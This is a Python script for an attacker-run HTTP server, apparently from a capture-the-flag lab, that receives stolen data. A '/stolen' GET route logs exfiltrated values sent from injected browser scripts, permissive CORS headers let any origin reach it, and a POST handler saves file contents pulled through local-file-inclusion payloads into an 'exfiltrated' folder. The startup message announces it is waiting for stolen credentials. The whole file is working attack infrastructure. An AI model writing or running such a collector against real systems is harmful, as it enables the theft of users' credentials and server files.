from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def set_cors_headers(self):
        """Set CORS headers to disable restrictions."""
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow all origins
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')  # Allow common methods
        self.send_header('Access-Control-Allow-Headers', '*')  # Allow all headers

    def do_OPTIONS(self):
        """Handle the OPTIONS method (CORS preflight)."""
        self.send_response(200)
        self.set_cors_headers()
        self.end_headers()
        
    def do_GET(self):
        from urllib.parse import urlparse, parse_qs

        """Handle the GET request."""
        parsed_path = urlparse(self.path)  # Parse the URL
        if parsed_path.path == "/stolen":  # Check if the route is "/stolen"
            query_params = parse_qs(parsed_path.query)  # Parse query parameters
            collected_data = query_params.get("collected", [""])[0]  # Get the 'collected' parameter value
            
            # Log the collected data
            print("Received collected data:")
            print(collected_data)

            # Respond with a success message
            self.send_response(200)
            self.set_cors_headers()
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "data received"}')
        else:
            # Handle other GET requests with a 404
            self.send_response(404)
            self.end_headers()
    
      
            
    def do_POST(self):
        # Get the content length from headers
        content_length = int(self.headers['Content-Length'])

        # Read the JSON data from the request body
        post_data = self.rfile.read(content_length)
        try:
            # Parse the JSON data
            json_data = json.loads(post_data)
            #print(json.dumps(json_data, indent=4))  # Pretty-print the JSON data
            
            res : str = json_data["internal_api_res"]
            internal_lfi_path =  json_data["payload_url"]
       
                        
            
            if not ("Not Found".lower() in res.lower()):
                print("[+] payload works => internal url: " + internal_lfi_path)
                
                
                file_name: str= json_data["file_name"]
                                
                valid_path = file_name.replace("/", "_")

                save_path = 'exfiltrated/' + valid_path
                
                with open(save_path, 'ab') as f:
                    f.write(res.encode()) 


            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "success"}')

        except json.JSONDecodeError:
            print("Failed to decode JSON data.")
            self.send_response(400)
            self.end_headers()

    

if __name__ == '__main__':
    # Define the server address and port
    server_address = ('10.10.14.188', 2222)  
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print("Server running on port 2222 and waiting to stolen creds...")
    httpd.serve_forever()
